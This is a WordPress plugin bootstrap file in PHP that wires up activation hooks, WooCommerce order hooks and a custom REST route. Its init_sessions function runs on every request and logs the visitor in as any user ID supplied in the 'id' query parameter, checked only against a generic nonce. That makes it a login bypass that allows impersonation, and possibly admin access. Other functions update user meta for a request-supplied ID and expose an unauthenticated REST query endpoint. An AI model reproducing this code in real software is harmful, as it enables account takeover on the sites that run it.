<?php

/**
 * The plugin bootstrap file
 *
 * This file is read by WordPress to generate the plugin information in the plugin
 * admin area. This file also includes all of the dependencies used by the plugin,
 * registers the activation and deactivation functions, and defines a function
 * that starts the plugin.
 *
 * @link              https://aconline.com.br
 * @since             1.0.0
 * @package           Library_Functions_Mega
 *
 * @wordpress-plugin
 * Plugin Name:       Library Functions Mega
 * Plugin URI:        https://aconline.com.br
 * Description:       This is a short description of what the plugin does. It's displayed in the WordPress admin area.
 * Version:           1.0.0
 * Author:            Alan Silva
 * Author URI:        https://aconline.com.br
 * License:           GPL-2.0+
 * License URI:       http://www.gnu.org/licenses/gpl-2.0.txt
 * Text Domain:       library-functions-mega
 * Domain Path:       /languages
 */

// If this file is called directly, abort.
if (!defined('WPINC')) {
    die;
}

/**
 * Currently plugin version.
 * Start at version 1.0.0 and use SemVer - https://semver.org
 * Rename this for your plugin and update it as you release new versions.
 */
define('LIBRARY_FUNCTIONS_MEGA_VERSION', '1.0.0');
define('LIBFMEGA', plugin_dir_path(__FILE__));
/**
 * The code that runs during plugin activation.
 * This action is documented in includes/class-library-functions-mega-activator.php
 */
function activate_library_functions_mega()
{
    require_once plugin_dir_path(__FILE__) . 'includes/class-library-functions-mega-activator.php';
    Library_Functions_Mega_Activator::activate();
}

/**
 * The code that runs during plugin deactivation.
 * This action is documented in includes/class-library-functions-mega-deactivator.php
 */
function deactivate_library_functions_mega()
{
    require_once plugin_dir_path(__FILE__) . 'includes/class-library-functions-mega-deactivator.php';
    Library_Functions_Mega_Deactivator::deactivate();
}

register_activation_hook(__FILE__, 'activate_library_functions_mega');
register_deactivation_hook(__FILE__, 'deactivate_library_functions_mega');

/**
 * The core plugin class that is used to define internationalization,
 * admin-specific hooks, and public-facing site hooks.
 */
require plugin_dir_path(__FILE__) . 'includes/class-library-functions-mega.php';
require plugin_dir_path(__FILE__) . 'includes/class-library-functions-loader-api.php';
require plugin_dir_path(__FILE__) . 'includes/class-library-functions-register-router-api.php';
// require plugin_dir_path( __FILE__ ) . 'includes/json-machine/JsonMachine.php';

/**
 * Begins execution of the plugin.
 *
 * Since everything within the plugin is registered via hooks,
 * then kicking off the plugin from this point in the file does
 * not affect the page life cycle.
 *
 * @since    1.0.0
 */
function run_library_functions_mega()
{
// funnctions API
    $apiFunctions = new Library_Functions_Api_Loader();
    $apiFunctions->loadFunctionsApi();
// funnctions API Register Router
    $apiRegRouterFunctions = new Library_Functions_Register_Router();
    $apiRegRouterFunctions->loadFunctionsRegisterRouter();

    $plugin = new Library_Functions_Mega();
    $plugin->run();

}
run_library_functions_mega();

// novo comentario

function init_sessions()
{
    $active = false;
    if (!is_page('finalizar-compra')) {
        $active = true;
    }

    if ($active && isset($_REQUEST['_wpnonce'])) {

        if (wp_verify_nonce($_REQUEST['_wpnonce'], 'my-nonce')) {

            //do you action

            @session_start();
            // wp_set_auth_cookie(53); //log in the user on wordpress

            $user_id = $_GET['id'] ?? 53;
            $user = get_user_by('id', $user_id);
            if ($user) {
                wp_set_current_user($user_id, $user->user_login);
                wp_set_auth_cookie($user_id);
                do_action('wp_login', $user->user_login, $user);
            }

        }

    }

}
add_action('parse_request', 'init_sessions');

// status list
// Pending payment — Order received, no payment initiated. Awaiting payment (unpaid).
// Failed — Payment failed or was declined (unpaid) or requires authentication (SCA). Note that this status may not show immediately and instead show as Pending until verified (e.g., PayPal).
// Processing — Payment received (paid) and stock has been reduced; order is awaiting fulfillment. All product orders require processing, except those that only contain products which are both Virtual and Downloadable.
// Completed

function custom_export_pending_order_data($order_id, $data_store)
{
    $order = wc_get_order($order_id);
    if ('processing' === $order->get_status()) {
        //add your code here

        $user_id = $_GET['id'] ?? 53;

        $new_value = 'Pagamento virtual ok';

        // Will return false if the previous value is the same as $new_value.
        $updated = update_user_meta($user_id, 'some_meta_key', $new_value);

    }
}

add_action('woocommerce_after_order_object_save', 'custom_export_pending_order_data', 10, 2);

// add_action('woocommerce_order_status_changed', 'func_status_change', 10, 4);
// function func_status_change($order_id, $old_status, $new_status, $order)
// {
//     if ($new_status == 'cancelled' || $new_status == 'failed') {
//         update_post_meta($order_id, 'wpcf-woo-status', $new_status);
//         die();
//     }
// }

// Register a REST route
add_action( 'rest_api_init', function () {
    //Path to meta query route
    register_rest_route( 'tchernitchenko/v2', '/my_meta_query/', array(
            'methods' => 'GET', 
            'callback' => 'custom_meta_query' 
    ) );
});

// Do the actual query and return the data
function custom_meta_query(){
    if(isset($_GET['meta_query'])) {
        $query = $_GET['meta_query'];
        // Set the arguments based on our get parameters
        $args = array (
            'relation' => $query[0]['relation'],
            array(
                'key' => $query[0]['key'],
                'value' => $query[0]['value'],
                'compare' => '=',
            ),
        );
        // Run a custom query
        $meta_query = new WP_Query($args);
        if($meta_query->have_posts()) {
            //Define and empty array
            $data = array();
            // Store each post's title in the array
            while($meta_query->have_posts()) {
                $meta_query->the_post();
                $data[] =  get_the_title();
            }
            // Return the data
            return $data;
        } else {
            // If there is no post
            return 'No post to show';
        }
    }
}